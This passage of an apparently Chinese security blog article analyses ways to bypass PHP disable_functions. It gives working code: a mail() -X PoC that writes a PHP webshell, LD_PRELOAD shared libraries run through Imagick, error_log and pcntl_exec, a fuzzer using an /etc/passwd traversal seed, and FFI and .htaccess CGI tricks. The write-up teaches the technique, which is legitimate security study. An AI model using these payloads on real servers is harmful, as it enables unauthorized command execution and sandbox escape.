<li>PostFix: [http://www.postfix.org/mailq.1.html](http://www.postfix.org/mailq.1.html)
</li>
<li>SendMail: [http://www.sendmail.org/~ca/email/man/sendmail.html](http://www.sendmail.org/~ca/email/man/sendmail.html)
</li>
```
error_reporting(E_ALL);
$body = '&lt;?php phpinfo();?&gt;';
$to = 'crispr@localhost';
$subject = 'Poc';
$header = 'From: root@localhost';
$sender= "attacker@localhost  -X/tmp/poc.php";
mail($to,$subject,$body,$header," -f $sender");
```

通过`-X`写入`log`到指定文件，可以造成文件上传：如上poc将上传`&lt;?php phpinfo();?&gt;`到`/tmp/poc.php`下：

[![](https://p4.ssl.qhimg.com/t0170bc049dd672ce1f.png)](https://p4.ssl.qhimg.com/t0170bc049dd672ce1f.png)

也可以通过`-C`读取配置文件然后记录到指定`log`中造成任意文件读取

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01284173a603c5217c.png)

### <a class="reference-link" name="%E9%80%9A%E8%BF%87ImageMagick%E6%9D%A5%E7%94%9F%E6%88%90%E6%96%B0%E8%BF%9B%E7%A8%8B%E8%BF%9B%E8%A1%8CBypass"></a>通过ImageMagick来生成新进程进行Bypass

**功能概述**<br>`ImageMagick`是第三方的图片处理软件<br>`imagick`是php的一个扩展模块，它调用`ImageMagick`提供的API来进行图片的操作。

#### <a class="reference-link" name="%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8Ghostscript%E8%BF%9B%E7%A8%8B%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"></a>外部调用Ghostscript进程进行绕过

`Ghostscript`是一套建基于`Adobe、PostScript`及可移植文档格式（PDF）的页面描述语言等而编译成的免费软件。<br>`ImageMagick`无法直接实现pdf文档到图片的转换，需要借助于`gostscript`软件包<br>
这样我们就很自然的想到通过`Imagick`提供的某些API需要调用`Ghostscript`,这样肯定会生成新的进程，就能通过`LD_PRELOAD`加载恶意的动态共享库，实现绕过<br>
从官网文档中可以知道使用`Imagic`处理如下文件后缀时会调用`Ghostscript`
<li>[ ] [https://imagemagick.org/script/formats.php](https://imagemagick.org/script/formats.php)
<pre><code class="hljs nginx">EPI  EPS  EPS2 EPS3 EPSF EPSI EPT PDF PS PS2 PS3
</code></pre>
</li>
可以直接利用Imagic类构造方法来实现：

```
&lt;?php
$img = new Imagick("1.pdf");
//注意1.pdf必须是真实存在的
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d016f3b2ed4fd85e.png)

发现会调用多个进程，使用`strace`进行跟踪，查看其调用的具体的API(以`/usr/bin/gs`为例)：

[![](https://p4.ssl.qhimg.com/t012a9f0498e127b9bc.png)](https://p4.ssl.qhimg.com/t012a9f0498e127b9bc.png)

并没有调用之前分析的`getuid`函数，所以需要重新选取新的系统函数进行同名编写，此处选择`fflush函数`，查看`fflush`文档可知，该传入变量是可以为空的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014c7c58624547c014.png)

因此可以通过编写`fflsh`进行绕过:

```
#include&lt;stdlib.h&gt;
void evil_code()`{`
    system("whoami");
`}`

int fflush()`{`
    if(getenv("LD_PRELOAD") == NULL)`{`
        return 0;
    `}`
    unsetenv("LD_PRELOAD");
    evil_code();
`}`
```

```
&lt;?php
system("whoami");
putenv("LD_PRELOAD=/home/php_learn/fflush_bypass.so");
$img = new Imagick("1.pdf");
```

发现的确通过Imagick的构造方法进行绕过system

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ab48ba7ce0a6bd6b.png)

同样使用`Imagic`来处理`.ept`文件时，追踪其调用情况，同样如官方文档所说调用`Ghostscript`，因此可以使用之前所述的文件格式结合`Imagic`来进行`disable_functions`绕过：

[![](https://p0.ssl.qhimg.com/t01ee4a21be783ebeb6.png)](https://p0.ssl.qhimg.com/t01ee4a21be783ebeb6.png)

```
&lt;?php
system("ifconfig");
putenv("LD_PRELOAD=/home/php_learn/fflush_bypass.so");
$img = new Imagick("1-0.ept");
```

#### <a class="reference-link" name="%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8ffmpeg%E8%BF%9B%E7%A8%8B%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"></a>外部调用ffmpeg进程进行绕过

**功能概述**<br>
FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。它包括了目前领先的音/视频编码库libavcodec。 FFmpeg是在 Linux 下开发出来的，但它可以在包括 Windows 在内的大多数操作系统中编译。<br>
通过官方文档可以知道当`ImageMagick`处理以下文件的时候会调用`ffmpeg`(文件必须存在)

```
wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016fe80af398aed50a.png)

由于编译出了点问题,`ffmpeg`本地一直没安装好，因此借用一张图不过其原理和使用`Ghostscript`是一样，都通过调用外部程序来实现进程增加，过程中需要知道`/usr/bin/ffmpeg`实现过程中调用了哪些API函数从而进行同名编写

#### <a class="reference-link" name="%E6%97%A0%E9%9C%80%E5%8A%AB%E6%8C%81%E5%BA%93%E5%87%BD%E6%95%B0%E7%9A%84LD_PRELOAD%E7%9A%84Bypass"></a>无需劫持库函数的LD_PRELOAD的Bypass

在之前的姿势中可以知道，我们在知道调用了除本进程之外的其他进程后，是通过了解该进程调用的库函数，通过编写同名函数设置`LD_PRELOAD`为恶意共享库，进行劫持库函数<br>
这里在之前有大佬分析过了，在这里大致说明其原理，`LD_PRELOAD`本身，系统通过它预先加载共享对象，如果存在某种方式使得新进程被加载时就会进行代码的执行，这样就不需要考虑劫持某一种系统函数，而在GCC中存在`C 语言扩展修饰符 __attribute__((constructor))`若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。当其出现在恶意共享库中时，那么一旦共享库被系统加载，会在`main`之前执行`__attribute__((constructor))`修饰的函数，因此可以无需劫持库函数而是相当于劫持共享库达到Bypass `disable_function`的目的。<br>
通过一个例子简单了解：

```
#include&lt;stdio,h&gt;
__attribute__((constructor)) void before_main()
`{`
    printf("before_main \n");
`}`

int main()
`{`
    printf("main \n");
    return 0;
`}`
```

[![](https://p3.ssl.qhimg.com/t014cda38494978f52c.png)](https://p3.ssl.qhimg.com/t014cda38494978f52c.png)

因此我们考虑直接使用`__attribute__((constructor))`劫持共享对象即可，这里直接借用现有的利用`__attribute__(())`的payload:

```
#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
`{`
    // get command line options and arg
    const char* cmdline = getenv("CMD");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) `{`
            if (strstr(environ[i], "LD_PRELOAD")) `{`
                    environ[i][0] = '\0';
            `}`
    `}`
    // executive command
    system(cmdline);
`}`
```

不过不明白此处为何不能直接`unsetenv("LD_PRELOAD")`,直接这样会导致死循环然后CPU飙到100%（不要问我为什么知道），所以还是通过上述的`payload`进行无劫持库函数来绕过

```
&lt;?php
system("whoami");
putenv("CMD=whoami");
putenv("LD_PRELOAD=/root/php_learn/attribute.so");
error_log('error',1);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0140a7ccff6d41cfe4.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8/bin/sh%20%E7%BB%93%E5%90%88putenv%E8%BF%9B%E8%A1%8CBypass"></a>利用/bin/sh 结合putenv进行Bypass

结合之前的分析，其实无论是`mail()`、`error_log`还是`imagick`在`execve`调用新的进程时，其实都出现了`/bin/sh`进程，因此可以通过劫持`/bin/sh`进程的API库函数来实现

```
readelf -Ws /usr/bin/sh  #getuid和getpid库函数都被调用
```

[![](https://p3.ssl.qhimg.com/t01b3956e46a251f7a8.png)](https://p3.ssl.qhimg.com/t01b3956e46a251f7a8.png)

这样即使没有`/usr/bin/sendmail`或者`/usr/bin/gs`，但是会生成`/usr/bin/sh`进程同样可以通过劫持系统库函数进行`disable_function`的绕过。

### <a class="reference-link" name="%E5%B0%8F%E7%BB%93"></a>小结

看到这里，其实总的来说，利用`LD_PRELOAD`来优先加载共享库都离不开新进程的启动，只有当新进程启动后才会加载`LD_PRELOAD`,因此其实也能知道某些常见的禁用函数是为何被禁用了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ea3d21fdaff566a7.png)

在PHP的官方文档中有各种扩展的PHP，其中**进程控制扩展**可以看到`PCNTL`和进程控制相关，pcntl是`linux`下的一个扩展，可以支持php的多线程操作,从安装中可以知道，并且默认是关闭的，但是基本上大多都会开启该扩展

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ad6da819e144e1de.png)

一共23个函数，而其中不乏对进程的操作能够产生新的进程，一旦此类函数能够被使用，结合`LD_PRELOAD`就能够通过新进程的产生实现绕过

[![](https://p0.ssl.qhimg.com/t01d0fcad9232ed6ab4.png)](https://p0.ssl.qhimg.com/t01d0fcad9232ed6ab4.png)

其中`pcntl_exec`能够直接调用外部程序进而对`distable_functions`绕过，因此可以看到基本在`disable_functions`设置里涉及到进程控制的相关扩展函数都会被禁用

```
&lt;?php pcntl_exec("/bin/sh",array("-c","whoami"));?&gt;
```



## Fuzz挖掘PHP调用新进程的系统（扩展）函数

在利用`LD_PRELOAD`中我们已经明确，如果想要加载恶意共享库，则必须要有新进程的产生，因此使用的 php 函数需要在内部调用`execve`等系统功能开启一个新进程，国外大佬有一篇文章对此展开了分析:<br>[https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/](https://)<br>
这里简要分析其思路:<br>
首先需要尽可能多的安装PHP扩展，fuzz面对的最大问题有两个，第一不知道函数的要求参数个数，第二不知道参数的类型，作者在其中讲述两种方法：<br>**第一可以使用php报错来正则提取出要求的`at least`或者`at most`**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0170d73c294859364f.png)

第二可以使用PHP的反射类`ReflectionFunction`，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。因此可以借助反射类来获取某一函数最大和默认需要的参数配置：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01911e2b847584f4f1.png)

当有了参数个数后，此时还有一个难题是无法知道参数预定义的类型，因此该作者给出了一个满足所有预定义类型的值`'1/../../../../../../../etc/passwd'`<br>
这个字符串可以作为`string，int、file和bool`<br>
Fuzz源码贴出（建议先将所有扩展配置好）

```
import os
import sys
import re
import subprocess


get_defined_function = os.popen("php -r 'print_r(get_defined_functions()[\'internal\']);'").readlines()

b = get_defined_function[2:-1]
b = map(str.strip, b)

for i in range(len(b)):
   b[i] = re.sub(r'.*&gt; ', '', b[i])

get_defined_function = b    # all PHP functions


# All seeds: string, int, file and boolean
string_seed = "'1/../../../../../../../etc/passwd'"

final_seed = ["'" + str(i)+string_seed[2:] for i in range(-10,11)]


fp = open("a.txt","w+")

for i in get_defined_function:
    process = subprocess.Popen("php -r '" + i + "();'",stderr=subprocess.PIPE,shell=True)
    (output,err) = process.communicate()

    print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    print err
    print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    try:
        minargs = int(re.findall(r'least .* p', err)[0][6:-2])
        print minargs

        arg_to_send = (string_seed+",")*(10) + string_seed

        cmd = 'php -r "' + i + '(' + arg_to_send + ');"'

        process = subprocess.Popen(cmd,stderr=subprocess.PIPE,shell=True)
        (output,err) = process.communicate()

        maxargs = int(re.findall(r'most \d parameters',err)[0][5:-11])
        print maxargs

    except:
        try:
            exactly = int(re.findall(r'exactly .* param',err)[0][8:-6])
            print exactly

            if(exactly):

                minargs = exactly
                print minargs

                maxargs = exactly
                print maxargs

            else:
                minargs=0
                maxargs=0
        except:
            minargs=0
            maxargs=0

    for j in range(minargs,maxargs+1):

        for k in final_seed:

            args = [k]*j

            arg_to_be_send = ",".join(args)
            # print arg_to_be_send

            cmd = 'php -r "' + i + '(' + arg_to_be_send + ');"'
            # print cmd

            fin_cmd = "strace -f "+ cmd + " 2&gt;&amp;1 | grep execve"
            # print fin_cmd

            out = re.findall(r'execve', ''.join(os.popen(fin_cmd).readlines()[1:]))

            if(len(out)&gt;0):
                print fin_cmd
                fp.write(fin_cmd+"\n")

            else:
                print "Not this one..

```

经过Fuzz后还有如下函数能够产生新的进程:
<li>
`mb_send_mail`：php-mbstring模块</li>
<li>
`imap_mail`：php-imap模块</li>
<li>
`libvirt_connect`php-libvirt-php模块</li>
<li>
`gnupg_init`php-gnupg模块</li>
如果目标系统安装了这些PHP模块，仍然可以通过`LD_PRELOAD`进行绕过,下面验证一个`gnupg`模块的函数`gnupg_init`,该函数进行一个初始化的`GnuPG`资源连接,可以看到会产生系统进程，而这些可执行文件中不乏`getpid`的系统命令：

[![](https://p5.ssl.qhimg.com/t013fbf433806ab8949.png)](https://p5.ssl.qhimg.com/t013fbf433806ab8949.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018682beba62373674.png)



## PHP7.4 利用FFI进行Bypass

`FFI（Foreign Function Interface）`，即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。

**FFI的使用分为声明和调用两个部分**<br>
举一个简单的使用Demo，从共享库中调用printf()函数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01af3aa6c7745ca337.png)

引用官方文档来说:<br>`FFI :: cdef`—创建一个新的FFI对象<br>
第一个参数包含常规C语言声明序列（类型，结构，函数，变量等）的字符串，第二个参数表示要加载并与定义**链接的共享库文件的名称**<br>
因此PHP 7.4中如果开区`FFI`扩展，便能够通过该扩展直接调用系统的`system`而绕过PHP中`system`函数：

[![](https://p5.ssl.qhimg.com/t0124c5416cd7826bb9.png)](https://p5.ssl.qhimg.com/t0124c5416cd7826bb9.png)

可以发现会直接新起`sh`进程：

[![](https://p5.ssl.qhimg.com/t011b072dfb6f6ff9ac.png)](https://p5.ssl.qhimg.com/t011b072dfb6f6ff9ac.png)



## 小结

主要是对一些绕过的原理进行了跟踪，当然绕过`disable_functions`还存在某些特定情况的绕过，例如`Fastcgi/PHP-FPM`通过修改解析后的键值对构造恶意的`fastcgi包`将加载扩展文件指向预先上传好的恶意扩展文件实现绕过，以及`Apache Mod CGI`，其原理是利用`htaccess`覆盖`apache`配置，增加cgi程序达成执行系统命令：<br>
利用方法 上传.htaccess

```
Options +ExecCGI //代表着允许使用mod_cgi模块执行CGI脚本
AddHandler cgi-script .test //将test后缀的文件解析成cgi程序
上传exp.test
#! /bin/sh
echo whoami
```

还有利用特定版本`php7-gc-bypass漏洞`,其利用`PHP garbage collector`程序中的堆溢出触发进而执行命令,影响范围:php7.0-7.3<br>`php-json-bypass漏洞`，利用json序列化程序中的堆溢出触发，以绕过disable_functions并执行系统命令，影响范围:php 7.1-7.3

主要是讲述了通过`LD_PRELOAD`进行绕过的原理，以及相关函数的底层实现和`mail`函数所存在的某些问题，也是个人对Bypass `disable_functions`原理的部分解读，如有写的不对的地方还请大佬多多指正
